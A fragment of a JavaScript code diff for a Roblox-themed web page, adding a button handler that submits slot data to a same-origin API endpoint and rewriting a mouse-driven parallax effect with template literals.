+  const btn = document.getElementById('submitAllBtn');
+  if (!btn) return;
+  btn.disabled = true; btn.textContent = 'Submitting…';
+  try {
+    const res = await fetch('/api/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ slug: PAGE_SLUG, slots }) });
+    const data = await res.json();
+    if (data.success) {
+      btn.textContent = '✓ Submitted!';
+      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
+      btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
+      const st = document.getElementById('submitStatus');
+      if (st) { st.textContent = '✓ All slots submitted successfully.'; st.style.color = '#4ade80'; }
+    } else { btn.disabled=false; btn.textContent='Submit All Slots'; alert('Error: '+(data.error||'Unknown')); }
+  } catch { btn.disabled=false; btn.textContent='Submit All Slots'; alert('Network error. Try again.'); }
+}
+
+/* ── PARALLAX CHARS on mousemove ── */
 document.addEventListener('mousemove', e => {
   const xRatio = (e.clientX / window.innerWidth - 0.5) * 2;
   const yRatio = (e.clientY / window.innerHeight - 0.5) * 2;
   document.querySelectorAll('.roblox-char').forEach((char, i) => {
     const depth = (i % 3 + 1) * 6;
     char.style.transform = char.classList.contains('char-1') || char.classList.contains('char-3') || char.classList.contains('char-6')
-      ? 'scaleX(-1) translate('+(-xRatio * depth)+'px, '+(-yRatio * depth)+'px)'
-      : 'translate('+(xRatio * depth)+'px, '+(yRatio * depth)+'px)';
+      ? \`scaleX(-1) translate(\${-xRatio * depth}px, \${-yRatio * depth}px)\`
+      : \`translate(\${xRatio * depth}px, \${yRatio * depth}px)\`;
   });
 });
 </script>
